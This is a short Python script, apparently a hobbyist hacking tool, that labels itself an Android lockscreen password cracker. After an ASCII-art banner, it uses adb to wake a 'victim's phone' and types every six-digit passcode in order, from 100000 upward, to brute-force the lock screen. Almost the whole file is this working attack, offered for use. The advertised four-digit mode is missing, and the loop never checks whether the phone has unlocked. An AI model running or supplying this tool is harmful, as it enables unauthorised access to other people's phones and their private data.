import os
from termcolor import colored

import time

RED = "\33[91m"
BLUE = "\33[94m"
GREEN = "\033[32m"
YELLOW = "\033[93m"
PURPLE = '\033[0;35m' 
CYAN = "\033[36m"
END = "\033[0m"

BANNER = f"""

{CYAN}

        $$\    $$\           $$\   $$\                                         $$$$$$$\                                $$\                           
        $$ |   $$ |          $$ |  $$ |                                        $$  __$$\                               $$ |                          
[$+++]  $$ |   $$ | $$$$$$\  $$ |$$$$$$\    $$$$$$\   $$$$$$\   $$$$$$\        $$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$\  $$ |  $$\  $$$$$$\   $$$$$$\  
        \$$\  $$  |$$  __$$\ $$ |\_$$  _|   \____$$\ $$  __$$\ $$  __$$\       $$$$$$$\ |$$  __$$\ $$  __$$\  \____$$\ $$ | $$  |$$  __$$\ $$  __$$\ 
         \$$\$$  / $$ /  $$ |$$ |  $$ |     $$$$$$$ |$$ /  $$ |$$$$$$$$ |      $$  __$$\ $$ |  \__|$$$$$$$$ | $$$$$$$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
          \$$$  /  $$ |  $$ |$$ |  $$ |$$\ $$  __$$ |$$ |  $$ |$$   ____|      $$ |  $$ |$$ |      $$   ____|$$  __$$ |$$  _$$<  $$   ____|$$ |      
           \$  /   \$$$$$$  |$$ |  \$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$\       $$$$$$$  |$$ |      \$$$$$$$\ \$$$$$$$ |$$ | \$$\ \$$$$$$$\ $$ |      
            \_/     \______/ \__|   \____/  \_______| \____$$ | \_______|      \_______/ \__|       \_______| \_______|\__|  \__| \_______|\__|
                                                     $$\   $$ |                                                                                      
                                                     \$$$$$$  |                                                                                      
                                                      \______/

[ @ ] A LOCKSCREEN PASSWORD CRACKER TOOL FOR ANDROID OS :)....!!!!

"""
                                         

print(BANNER)

print("")

while True :

    statement = colored("[ + ] Enter The Length Of The Lockscreen Passcode [AVAILABLE LENGTHS : 4 & 6] $ ", 'red')

    ui = int(input(statement))

    if ui == 6 :

        print("")

        print("")

        time.sleep(2)

        os.system(f"adb devices")

        print(colored("Swith on victim's phone within 6 seconds....!!!!", 'cyan', 'on_white'))

        time.sleep(6)

        os.system("adb shell input swipe 250 800 250 400 100")

        time.sleep(5)

        for tries in range(100000, 1000000) :

            os.system(f'adb shell input text {tries}')

            print("")

            time.sleep(0.2)

            print(colored(f"[ * ] Passcodes tried : {tries}", 'green'))

            time.sleep(1.3)

        print(tries)

        print("")